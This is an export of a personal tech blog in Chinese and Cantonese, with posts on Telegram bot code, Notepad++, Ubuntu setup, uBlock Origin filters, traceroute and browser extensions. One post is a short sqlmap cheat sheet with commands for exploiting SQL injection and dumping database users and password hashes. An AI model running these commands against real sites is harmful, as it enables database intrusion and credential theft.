    <url>/2022/01/09/python-pyTelegramBotAPI-sendchataction-f/</url>
    <content><![CDATA[<h1 id="send-chat-action"><a href="#send-chat-action" class="headerlink" title="send_chat_action()"></a>send_chat_action()</h1><ul>
<li><p>chat_id <code>(int | str)</code> – Unique identifier (int) or username (str) of the target chat. For your personal cloud (Saved Messages) you can simply use “me” or “self”. For a contact that exists in your Telegram address book you can use his phone number (str).</p>
</li>
<li><p>action <code>(str)</code> – Type of action to broadcast. Choose one, depending on what the user is about to receive: “typing” for text messages, “upload_photo” for photos, “record_video” or “upload_video” for videos, “record_audio” or “upload_audio” for audio files, “upload_document” for general files, “find_location” for location data, “record_video_note” or “upload_video_note” for video notes, “choose_contact” for contacts, “playing” for games, “speaking” for speaking in group calls or “import_history” for importing history, “choose_sticker” for stickers or “cancel” to cancel any chat action currently displayed.</p>
</li>
</ul>
<h2 id="示範"><a href="#示範" class="headerlink" title="示範"></a>示範</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Send &quot;typing&quot; chat action</span></span><br><span class="line">bot.send_chat_action(chat_id, <span class="string">&quot;typing&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send &quot;upload_video&quot; chat action</span></span><br><span class="line">bot.send_chat_action(chat_id, <span class="string">&quot;upload_video&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send &quot;playing&quot; chat action</span></span><br><span class="line">bot.send_chat_action(chat_id, <span class="string">&quot;playing&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Cancel any current chat action</span></span><br><span class="line">bot.send_chat_action(chat_id, <span class="string">&quot;cancel&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Telegram</tag>
      </tags>
  </entry>
  <entry>
    <title>Notepad ++ - 刪除 shell integration Notepad</title>
    <url>/2022/01/09/remove-shell-integration-of-Notepad/</url>
    <content><![CDATA[<h1 id="How"><a href="#How" class="headerlink" title="How ?"></a>How ?</h1><p>Here’s the non-registry, non-download way to uninstall the Notepad++ shell extension. Using the Command Prompt as an admin, run the following:</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> &quot;\Program Files (x86)\Notepad++&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">regsvr32 /u NppShell_06.dll2</span><br></pre></td></tr></table></figure>

<p>To make this change active, you may need to <a href="https://lifehacker.com/restart-windows-explorer-the-safe-way-356915">restart explorer</a>.</p>
<hr>
<p>You can also reinstall the extension and get customization options:</p>
<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">regsvr32 /i NppShell_06.dll</span><br></pre></td></tr></table></figure>

<p>1: If you use 32-bit Windows or installed Notepad++ in a different folder, the path may be different.</p>
<p>2: NppShell_06.dll is the correct filename for the most recent version of Notepad++ (6.6.9). If NppShell_06.dll is not found, you may have a different version. </p>
<p>source :<br><a href="https://superuser.com/questions/57232/how-to-remove-shell-integration-of-notepad#423692">https://superuser.com/questions/57232/how-to-remove-shell-integration-of-notepad#423692</a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>問題</tag>
        <tag>Notepad++</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLMAP - 注入數據庫漏洞工具</title>
    <url>/2022/01/14/sqlmap-commands/</url>
    <content><![CDATA[<img src="cover.svg" width="200px"/>

<h2 id="SQLMAP-說明"><a href="#SQLMAP-說明" class="headerlink" title="SQLMAP 說明"></a>SQLMAP 說明</h2><p>sqlmap 是一個開源滲透測試工具，可以自動檢測和利用 SQL 注入漏洞並接管數據庫服務器。</p>
<p>它配備了強大的檢測引擎，為滲透測試人員提供了許多功能，包括數據庫指紋識別、從數據庫中提取數據、訪問底層文件系統。</p>
<h2 id="SQLMAP-指令"><a href="#SQLMAP-指令" class="headerlink" title="SQLMAP 指令"></a>SQLMAP 指令</h2><hr>
<h3 id="列出數據庫"><a href="#列出數據庫" class="headerlink" title="列出數據庫"></a>列出數據庫</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://url/news?id=1&quot;</span><br></pre></td></tr></table></figure>

<h3 id="數據庫用戶密碼"><a href="#數據庫用戶密碼" class="headerlink" title="數據庫用戶密碼"></a>數據庫用戶密碼</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u “http://url/news?id=1″ –passwords</span><br></pre></td></tr></table></figure>

<h3 id="Post-Request"><a href="#Post-Request" class="headerlink" title="Post Request"></a>Post Request</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.121/sqlmap/oracle/post_int.php&quot; –method POST –data “id=1″ </span><br></pre></td></tr></table></figure>

<h3 id="列出數據庫用戶"><a href="#列出數據庫用戶" class="headerlink" title="列出數據庫用戶"></a>列出數據庫用戶</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1&quot; –users -v 0</span><br></pre></td></tr></table></figure>

<p>參考資料 …<br><a href="https://newgoodlooking.pixnet.net/blog/post/113766687">https://newgoodlooking.pixnet.net/blog/post/113766687</a></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>網站</tag>
      </tags>
  </entry>
  <entry>
    <title>Cyber Security - 安裝作業系統後必須要做的安全事項</title>
    <url>/2022/06/11/system-install-after-most-do-things/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>當你剛剛安裝好你的作業系統後，<br>以安全角度是並未做好設置，<br>你必須進行以下操作來為你的系統有更進一步的安全。</p>
<h2 id="第一樣"><a href="#第一樣" class="headerlink" title="第一樣"></a>第一樣</h2><ul>
<li>本機帳號加入 <code>一般用戶</code> 權限的帳號</li>
</ul>
<p>安裝後，<br>部份系統是沒有為你建立普通權限的本機帳號，<br>像是 Windows 這樣的作業系統，<br>預設是使用 <code>系統官理員</code> 的帳號，<br>他並沒有為你建立普通帳號，<br>當你什麼事情也是使用 <code>系統官理員</code> 身份進行，<br>在電腦世界是相當危險，<br>所以你要做的是，<br>為你的系統建立一個 <code>一般權限</code> 的帳號，<br>平時使用 <code>一般權限</code> 的帳號，<br>需要使用 <code>官理員</code> 權限才切換帳號，<br>這樣才是最好的做法。</p>
<h2 id="第二樣"><a href="#第二樣" class="headerlink" title="第二樣"></a>第二樣</h2><ul>
<li>瀏覽器安裝插件</li>
</ul>
<p>你平時上網的時候，<br>每個網站也有各種不同的插件和腳本，<br>你並不知道當中加入了什麼，<br>有可能是有害你電腦的插件，<br>有毒的廣告，木馬等等。</p>
<p>建議安裝以下插件。</p>
<h3 id="Privay-Badger"><a href="#Privay-Badger" class="headerlink" title="Privay Badger"></a>Privay Badger</h3><blockquote>
<p>將追蹤網站封鎖。</p>
</blockquote>
<h3 id="ublock-Origin"><a href="#ublock-Origin" class="headerlink" title="ublock Origin"></a>ublock Origin</h3><blockquote>
<p>封鎖不同的有害連結。</p>
</blockquote>
<h3 id="HTTPS-Everywhere"><a href="#HTTPS-Everywhere" class="headerlink" title="HTTPS Everywhere"></a>HTTPS Everywhere</h3><blockquote>
<p>將你瀏覽的網站加入 HTTPS，<br>將你和網站的連結加多一層保護 (加密連線)，<br>防止 Mitm Attack (中間人功擊) 等。</p>
</blockquote>
<h1 id="以上就是我個人認為必須要做的事情。"><a href="#以上就是我個人認為必須要做的事情。" class="headerlink" title="以上就是我個人認為必須要做的事情。"></a>以上就是我個人認為必須要做的事情。</h1>]]></content>
      <categories>
        <category>三修系統大撚哂</category>
      </categories>
      <tags>
        <tag>Cyber Security</tag>
      </tags>
  </entry>
  <entry>
    <title>網站版本動向 - 2022.6.20 Start</title>
    <url>/2022/06/20/this-blog-version/</url>
    <content><![CDATA[<h1 id="2022-6-20-Main"><a href="#2022-6-20-Main" class="headerlink" title="2022.6.20 Main"></a>2022.6.20 Main</h1><ol>
<li>正式加入 Google Analytics</li>
<li>大量文章修改至更詳細</li>
<li>小量不必要文章刪除</li>
</ol>
<h1 id="2022-6-22-Main"><a href="#2022-6-22-Main" class="headerlink" title="2022.6.22 Main"></a>2022.6.22 Main</h1><ol>
<li>加入 Google AdSense</li>
</ol>
<h1 id="2022-6-25"><a href="#2022-6-25" class="headerlink" title="2022.6.25"></a>2022.6.25</h1><ol>
<li>更改全局字體，更改 code block 字體</li>
</ol>
<h1 id="2022-7-5"><a href="#2022-7-5" class="headerlink" title="2022.7.5"></a>2022.7.5</h1><ol>
<li>加入 Cloudflare Analytics</li>
<li>已使用網域！！</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Traceroute 指令 - 追蹤封包傳遞</title>
    <url>/2022/02/03/traceroute-commands/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>簡單黎講，<br>就係睇你連線去呢個位置既時候，<br>會更 Detail 咁睇到，<br>會連到去既位置，</p>
<p>亦既係話，<br>當如果有其他人入侵你部機，<br>例如 miti attack 你部機，<br>咁就會睇到 trace 到既位置係有唔同。<br>因為 miti attack 係會必須經過 Hacker 部機，<br>再連到你上網既位置。</p>
<h1 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h1><p>有啲 Linux 機本身係冇裝到，<br>咁你打返呢句裝</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install traceroute -y</span><br></pre></td></tr></table></figure>

<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> traceroute www.google.com</span></span><br><span class="line">traceroute to www.google.com (1.1.1.1), 30 hops max, 60 byte packets</span><br><span class="line"> 1  _gateway (10.0.0.0)  0.367 ms  0.350 ms  0.342 ms</span><br><span class="line"> 2  * * *</span><br><span class="line"> 3  * * *</span><br></pre></td></tr></table></figure>

<p><a href="https://www.ltsplus.com/linux/traceroute-command">https://www.ltsplus.com/linux/traceroute-command</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>uBlock Origin - 封鎖煩人的要求使用 Cookie 彈出視窗。</title>
    <url>/2022/06/29/ub-block-this-Before-you-continue-to-Google-Search/</url>
    <content><![CDATA[<img src="/img/Post/image/ublock/logo.svg" width="200px"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>當你使用 Google 尋找內容，然後顯示一個視窗說明 (如下圖)。</p>
<pre><code>Before you continue to Google Search
</code></pre>
<p>而本文章會教你如何封鎖這個視窗，令你的瀏覽器不再彈出視窗 <code>要求使用 Cookie</code>。</p>
<img src="/2022/06/29/ub-block-this-Before-you-continue-to-Google-Search/1.png" class="">


<h1 id="有關封鎖"><a href="#有關封鎖" class="headerlink" title="有關封鎖"></a>有關封鎖</h1><p>要開始封鎖先，我們需要於瀏覽器安裝 ublock Origin 插件，網址如下：</p>
<p>【Google Chrome】: <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm">按這裡</a><br>【Firefox】: <a href="https://addons.mozilla.org/en-GB/firefox/addon/ublock-origin/">按這裡</a></p>
<h2 id="安裝插件-Firefox"><a href="#安裝插件-Firefox" class="headerlink" title="安裝插件 (Firefox)"></a>安裝插件 (Firefox)</h2><hr>
<h3 id="第一步-Firefox"><a href="#第一步-Firefox" class="headerlink" title="第一步 (Firefox)"></a>第一步 (Firefox)</h3><p>點擊 <code>Add to Firefox</code>。</p>
<img src="/2022/06/29/ub-block-this-Before-you-continue-to-Google-Search/2.png" class="">

<h3 id="第二步-Firefox"><a href="#第二步-Firefox" class="headerlink" title="第二步 (Firefox)"></a>第二步 (Firefox)</h3><p>點擊 <code>Add</code>。</p>
<img src="/2022/06/29/ub-block-this-Before-you-continue-to-Google-Search/3.png" class="">

<h3 id="安裝完成-Firefox"><a href="#安裝完成-Firefox" class="headerlink" title="安裝完成 (Firefox)"></a>安裝完成 (Firefox)</h3><p>完成以上步驟後，已經安裝完成，可查看瀏覽器右方會多出了一個圖示，他就是 ublock Origin 的插件圖示，點擊他會出現更多內容。</p>
<img src="/2022/06/29/ub-block-this-Before-you-continue-to-Google-Search/4.png" class="">

<h2 id="加入新的-Tags"><a href="#加入新的-Tags" class="headerlink" title="加入新的 Tags"></a>加入新的 Tags</h2><p>接下來我們需要新增新的規則以封鎖這個視窗的 HTML Tags</p>
<hr>
<h3 id="第一步-開筆"><a href="#第一步-開筆" class="headerlink" title="第一步 (開筆)"></a>第一步 (開筆)</h3><p>點擊 uBlock Origin 後，再點擊下方的 <code>筆</code>。</p>
<img src="/2022/06/29/ub-block-this-Before-you-continue-to-Google-Search/5.png" class="">

<h3 id="第二步-選擇移除位置"><a href="#第二步-選擇移除位置" class="headerlink" title="第二步 (選擇移除位置)"></a>第二步 (選擇移除位置)</h3><p>點擊後你會發現瀏覽器多變成了紅色，這邊要選擇你想除移的位置，我們將 Mouse 移到最邊邊，然後點擊一下以示確定。</p>
<img src="/2022/06/29/ub-block-this-Before-you-continue-to-Google-Search/6.png" class="">

<h3 id="第三步-視窗彈出"><a href="#第三步-視窗彈出" class="headerlink" title="第三步 (視窗彈出)"></a>第三步 (視窗彈出)</h3><p>當你點擊後你會發現多了一個視窗於右下角，這個就是你點擊後他偵測到的 Tags。</p>
<img src="/2022/06/29/ub-block-this-Before-you-continue-to-Google-Search/7.png" class="">

<h3 id="第四步-測試-Tags"><a href="#第四步-測試-Tags" class="headerlink" title="第四步 (測試 Tags)"></a>第四步 (測試 Tags)</h3><p>來到這一步我們要進行測試，看看是否移除了我們想要的東西。<br>點擊 <code>Preview</code> 查看。</p>
<img src="/2022/06/29/ub-block-this-Before-you-continue-to-Google-Search/8.png" class="">

<h3 id="第五步-確定-Tags"><a href="#第五步-確定-Tags" class="headerlink" title="第五步 (確定 Tags)"></a>第五步 (確定 Tags)</h3><p>OK，點擊後發現不想要的內容不見了，但是有點怪怪的，就是發現顏色還沒有改變至白色 (Background)，<br>這表示我們要去除的 Tags 並不是這個，一但選擇了這個，<br>雖然不見了視窗，但由於這個視窗有幾層的關係，我們需要將他全部去除才能正常使用頁面。</p>
<img src="/2022/06/29/ub-block-this-Before-you-continue-to-Google-Search/9.png" class="">

<h3 id="第六步-Cosmetic-filter"><a href="#第六步-Cosmetic-filter" class="headerlink" title="第六步 (Cosmetic filter)"></a>第六步 (Cosmetic filter)</h3><p>我們點擊下方的 Cosmetic filter 所顯示的 Tags (這邊的 Tags 會自動顯示你有可能想要的 Tags)。<br>我們每一個都點擊一次看看效果如何，再決定哪一個是真正封鎖全部。</p>
<p>嘗試點擊第二個 <code>##.HTjtHe</code>，發現畫面都白了，能正常顯示內容。</p>
<img src="/2022/06/29/ub-block-this-Before-you-continue-to-Google-Search/10.png" class="">

<h3 id="第七步-新增規則"><a href="#第七步-新增規則" class="headerlink" title="第七步 (新增規則)"></a>第七步 (新增規則)</h3><p>決定好是這個 Tags 後，點擊 <code>Create</code> 將他新增至 Filter 名單當中。</p>
<img src="/2022/06/29/ub-block-this-Before-you-continue-to-Google-Search/11.png" class="">


<h2 id="查看新增內容"><a href="#查看新增內容" class="headerlink" title="查看新增內容"></a>查看新增內容</h2><p>開啟瀏覽器內的插件設定後然後到 <code>My filter</code> 查看，會發現多了一個規則，<br>這就是你剛剛按下 <code>Create</code> 的規則，如果你不想要只需要將這行移除就可以了。</p>
<img src="/2022/06/29/ub-block-this-Before-you-continue-to-Google-Search/12.png" class="">


<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>Tags 會有機會隨住網站的變動而改變了，所以有可能會突然失效，如果失效你只需要再次做一次以上的操作新增多一個 Tags 就可以了。</p>
]]></content>
      <categories>
        <category>uBlock Origin</category>
      </categories>
      <tags>
        <tag>Extensions</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu - 查背景圖片位置</title>
    <url>/2021/12/20/ubuntu-findout-location-paths-desktop-images/</url>
    <content><![CDATA[<h1 id="點查"><a href="#點查" class="headerlink" title="點查 ?"></a>點查 ?</h1><p>開 Terminal 打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gsettings get org.gnome.desktop.background picture-uri</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gsettings list-recursively | grep background</span><br></pre></td></tr></table></figure>

<p>之後會出左條 Paths, Copy 條 Path 再打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nautilus [your_paths]</span><br></pre></td></tr></table></figure>

<p>搞掂！</p>
]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu - 安裝 Chromium</title>
    <url>/2022/01/09/ubuntu-install-Chromium/</url>
    <content><![CDATA[<img src="Chromium_Material_Icon.svg.png" width="200" hegiht="300"/>

<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p><a href="https://www.chromium.org/">Chromium</a> 是為現代網絡構建的快速、穩定和安全的瀏覽器，它是許多瀏覽器的基礎，包括世界上最流行的網絡瀏覽器 Google Chrome。<br>Chromium 和 Chrome 之間的主要區別在於 Chromium 是開源的，Chromium 不包含專有的網絡編解碼器，也不向 Google 發送崩潰報告和使用跟踪，如果您更喜歡開源應用程序，那麼 Chromium 是一個絕佳的選擇。</p>
<h1 id="安裝-APT"><a href="#安裝-APT" class="headerlink" title="安裝 (APT)"></a>安裝 (APT)</h1><p>開 Terminal 打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install chromium-browser</span><br></pre></td></tr></table></figure>

<p>完成。</p>
<h1 id="安裝-snap"><a href="#安裝-snap" class="headerlink" title="安裝 (snap)"></a>安裝 (snap)</h1><p>開 Terminal 打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo snap install chromium</span><br></pre></td></tr></table></figure>

<p>完成。</p>
]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu setup 速成 / 倉頡 輸入法 (ibus)</title>
    <url>/2021/12/20/ubuntu-setup-cangjie-quick/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Ubuntu 本身係已經裝好 ibus 速成 倉頡。<br>我地要做既係需要 enabled 返佢就得，</p>
<p>今次呢篇文會教你點將 ibus 速成改到好似 Windows 咁撳制。</p>
<p>但係點整？<br>以下落黎就會教你點做 :3</p>
<h2 id="點裝？"><a href="#點裝？" class="headerlink" title="點裝？"></a>點裝？</h2><p>開你既 Terminal 打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locale -a</span><br></pre></td></tr></table></figure>

<p>見到 有 PrintOut <code>zh_HK.utf8</code> or <code>zh_TW.utf8</code>，<br>咁即係系統已經裝左中文繁體語言Package，如果冇顯示，<br>撳 Menu Search <code>Language Support</code> 再安裝返語言套件。</p>
<h2 id="完整影片安裝-Language"><a href="#完整影片安裝-Language" class="headerlink" title="完整影片安裝 Language"></a>完整影片安裝 Language</h2><p>裝既時候係需要啲時間，<br>大概 around 要裝 5 分鐘</p>
<img src="/2021/12/20/ubuntu-setup-cangjie-quick/after-final.gif" class="">

<p>當你裝完再 reboot 部機就會生效</p>
<h2 id="Enabled-中文輸入法-速成-Classic"><a href="#Enabled-中文輸入法-速成-Classic" class="headerlink" title="Enabled 中文輸入法 (速成 Classic)"></a>Enabled 中文輸入法 (速成 Classic)</h2><p>留意返 Classic 先係我地 Windows 打開既速成<br>速成係有分第幾代既 :p</p>
<p>之後點做？</p>
<p>我唔打啦，自己睇片 XDDDD</p>
<img src="/2021/12/20/ubuntu-setup-cangjie-quick/enabled-quickclassic-final.gif" class="">

<h2 id="改做-Windows-設定-下一頁，殘繁字-List"><a href="#改做-Windows-設定-下一頁，殘繁字-List" class="headerlink" title="改做 Windows 設定 (下一頁，殘繁字 List)"></a>改做 Windows 設定 (下一頁，殘繁字 List)</h2><p>因為 ibus 本身既</p>
<ul>
<li>下一頁</li>
<li>換輸入法</li>
<li>語言係有殘體字<br>都唔係好似 Windows 咁係用<br><code>Ctrl + Space</code> 同 <code>Space</code></li>
</ul>
<p>預設會係 撳 +- 下一頁上一頁<br>而預設會係只有繁體字係 list入面</p>
<p>另外，原本我地 Windows 打開既速成入面係有殘體字喺度，<br>所以我地要做一樣野就係喺 ibus 速成 setting 入面改做繁殘字 list，<br>咁先係原本 Windows 速成條 List.</p>
<p>我首先會示範改 語言 同埋 撳 <code>Space</code> 換下一頁<br>睇片 ~~</p>
<img src="/2021/12/20/ubuntu-setup-cangjie-quick/space%20next%20page%20and%20all%20chinese-final.gif" class="">

<p>完成呢步你就可以 撳 <code>Space</code> 換下一頁<br>字既 List 都會有殘體字，<br>即係 Windows 既 List ~</p>
<h3 id="改做-Winodws-設定-換輸入法"><a href="#改做-Winodws-設定-換輸入法" class="headerlink" title="改做 Winodws 設定 (換輸入法)"></a>改做 Winodws 設定 (換輸入法)</h3><p>我地原本 Linux 佢 Default 係撳 tab 換輸入法，<br>但係如果我地想改返做 Ctrl + space 好似 Windows 咁樣，<br>係需要入去 Settings 改，<br>右下角，再 Serach Setting。</p>
<p>睇片 :&gt;</p>
<img src="/2021/12/20/ubuntu-setup-cangjie-quick/ctrl%20+%20space-final.gif" class="ctrl +">


<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>當你完成哂以上咁多個步驟就成功改到好似 Windows 咁啦。<br>但係有樣野係唔得既，<br>就係加 <code>關聯字</code>，<br>呢樣野 Linux 咁耐以黎都係未有，<br>所以大家唔洗好奇點解冇啦 …<br>我都想有得用 ._.</p>
]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>瀏覽器插件推薦 - 方便開發者 Debug (開發者)</title>
    <url>/2022/02/08/web-extensions-Developer/</url>
    <content><![CDATA[<p align="center">
    <img src="/img/Post/image/Browser/cover.png" width="auto" style="border-radius: 60%;"/>
    <b><span style="font-size:larger;">瀏覽器插件</span></b>
    <center>方便開發者 Debug。</center>
</p>

<h1 id="開發者類別的瀏覽器插件-排名不分先後"><a href="#開發者類別的瀏覽器插件-排名不分先後" class="headerlink" title="開發者類別的瀏覽器插件 (排名不分先後)"></a>開發者類別的瀏覽器插件 (排名不分先後)</h1><p>以下連結會帶你去到官方網站或者 Github。</p>
<ul>
<li><a href="https://github.com/ysard/cookie-quick-manager">Cookie Quick Manager</a></li>
<li><a href="https://add0n.com/stylus.html">Stylus</a></li>
<li><a href="https://www.wappalyzer.com/">Wappalyzer</a></li>
</ul>
<h2 id="1-Cookie-Quick-Manager"><a href="#1-Cookie-Quick-Manager" class="headerlink" title="1. Cookie Quick Manager"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/cookie-quick-manager/">1. Cookie Quick Manager</a></h2><p>用於管理 cookie（查看、搜索、創建、編輯、刪除、備份、恢復、防止刪除等）的插件。</p>
<img src="/2022/02/08/web-extensions-Developer/cqm.png" class="">

<hr style="border:2px solid grey"></hr>

<h2 id="2-Stylus"><a href="#2-Stylus" class="headerlink" title="2. Stylus"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/styl-us/">2. Stylus</a></h2><p>使用 Stylus 重新設計您最愛的網頁，一個積極開發且由社群所驅動的使用者樣式管理器。從流行的線上倉庫簡單地安裝自訂的主題，或建立、編輯與管理您自己的個人化 CSS 樣式表。</p>
<img src="/2022/02/08/web-extensions-Developer/stylus.png" class="">
<img src="/2022/02/08/web-extensions-Developer/stylus-2.png" class="">
<img src="/2022/02/08/web-extensions-Developer/stylus-3.png" class="">

<hr style="border:2px solid grey"></hr>

<h2 id="3-Wappalyzer"><a href="#3-Wappalyzer" class="headerlink" title="3. Wappalyzer"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/wappalyzer/">3. Wappalyzer</a></h2><p>識別網站上的技術 </p>
<img src="/2022/02/08/web-extensions-Developer/Wappalyzer.png" class="">

<hr style="border:2px solid grey"></hr>]]></content>
      <categories>
        <category>Browser</category>
      </categories>
      <tags>
        <tag>Extensions</tag>
        <tag>推薦</tag>
      </tags>
  </entry>
  <entry>
    <title>瀏覽器插件推薦 - 使用瀏覽器更得心應手 (其他)</title>
    <url>/2022/02/08/web-extensions-others/</url>
    <content><![CDATA[<p align="center">
    <img src="/img/Post/image/Browser/cover.png" width="auto" style="border-radius: 60%;"/>
    <b><span style="font-size:larger;">瀏覽器插件</span></b>
    <center>讓你用瀏覽器更加得心應手。</center>
</p>

<h1 id="瀏覽器插件推薦-排名不分先後"><a href="#瀏覽器插件推薦-排名不分先後" class="headerlink" title="瀏覽器插件推薦 (排名不分先後)"></a>瀏覽器插件推薦 (排名不分先後)</h1><p>以下連結會帶你去到官方網站或者 Github。</p>
<ul>
<li><a href="https://flagfox.wordpress.com/">1. Flagfox</a></li>
<li><a href="https://www.reddit.com/r/Imagus">2. Imagus</a></li>
<li><a href="https://add0n.com/popup-blocker.html">3. Popup Blocker</a></li>
<li><a href="https://github.com/dessant/search-by-image">4. Search by Image</a></li>
<li><a href="http://searchpreview.de/">5. SearchPreview</a></li>
<li><a href="https://github.com/drive4ik/simple-tab-groups">6. Simple Tab Groups</a></li>
<li><a href="https://tab-session-manager.sienori.com/">7. Tab Session Manager</a></li>
<li><a href="https://github.com/Bill13579/tabby">8. Tabby - Window and Tab Manager</a></li>
<li><a href="https://www.tampermonkey.net/">9. Tampermonkey</a></li>
<li><a href="https://github.com/M-Reimer/undoclosetab">10.Undo Close Tab</a></li>
<li><a href="https://bitwarden.com/">11. Bitwarden - Free Password Manager</a></li>
<li><a href="https://github.com/animeshkundu/youtube-audio">12. Youtube Audio</a></li>
<li><a href="https://github.com/lawfx/YoutubeNonStop">13. YouTube NonStop</a></li>
</ul>
<h1 id="1-Flagfox"><a href="#1-Flagfox" class="headerlink" title="1. Flagfox"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/flagfox/">1. Flagfox</a></h1><p>Flagfox 是一個 Firefox 擴展，通過在 URL 後面顯示相應的國家標誌，以圖形方式顯示打開網站的 Web 服務器所在的國家/地區。 </p>
<img src="/2022/02/08/web-extensions-others/fg.png" class="">
<img src="/2022/02/08/web-extensions-others/fg-2.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="2-Imagus"><a href="#2-Imagus" class="headerlink" title="2. Imagus"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/imagus/">2. Imagus</a></h1><p>放大縮略圖，並通過鼠標懸停顯示來自鏈接的圖像/視頻。</p>
<img src="/2022/02/08/web-extensions-others/imagus.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="3-Popup-Blocker"><a href="#3-Popup-Blocker" class="headerlink" title="3. Popup Blocker"></a><a href="https://addons.mozilla.org/en-US/firefox/addon/popup-blocker/">3. Popup Blocker</a></h1><p>默認情況下嚴格阻止來自任何網站的所有彈出請求。 打開一個通知窗口，允許您接受、拒絕、打開後台頁面的彈窗，或將當前頁面重定向到彈窗地址</p>
<img src="/2022/02/08/web-extensions-others/popupblocker.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="4-Search-by-Image"><a href="#4-Search-by-Image" class="headerlink" title="4. Search by Image"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/search_by_image/">4. Search by Image</a></h1><p>強大的圖片搜索工具，支持各種搜索引擎，如Google、Bing</p>
<img src="/2022/02/08/web-extensions-others/search-by-image.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="5-SearchPreview"><a href="#5-SearchPreview" class="headerlink" title="5. SearchPreview"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/searchpreview/">5. SearchPreview</a></h1><p>SearchPreview 通過在 Google™、DuckDuckGo™、Yahoo™ 和 Bing™ 搜索結果中插入站點預覽圖像（縮略圖）和流行度排名來增強您的搜索結果頁面。 </p>
<img src="/2022/02/08/web-extensions-others/searchpreview.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="6-Simple-Tab-Groups"><a href="#6-Simple-Tab-Groups" class="headerlink" title="6. Simple Tab Groups"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/simple-tab-groups/">6. Simple Tab Groups</a></h1><p>創建、修改和快速更改選項Tab Groups </p>
<img src="/2022/02/08/web-extensions-others/simple-tab-groups.png" class="">

<hr style="border:2px solid grey"></hr>

<h1 id="7-Tab-Session-Manager"><a href="#7-Tab-Session-Manager" class="headerlink" title="7. Tab Session Manager"></a><a href="https://addons.mozilla.org/zh-TW/firefox/addon/tab-session-manager/">7. Tab Session Manager</a></h1><p>保存和恢復窗口和選項卡的狀態。支持自動保存和 Cloud 同步。 </p>
<img src="/2022/02/08/web-extensions-others/tab-session-manager.png" class="">
<img src="/2022/02/08/web-extensions-others/tab-session-manager-2.png" class="">

<hr style="border:2px solid grey"></hr>

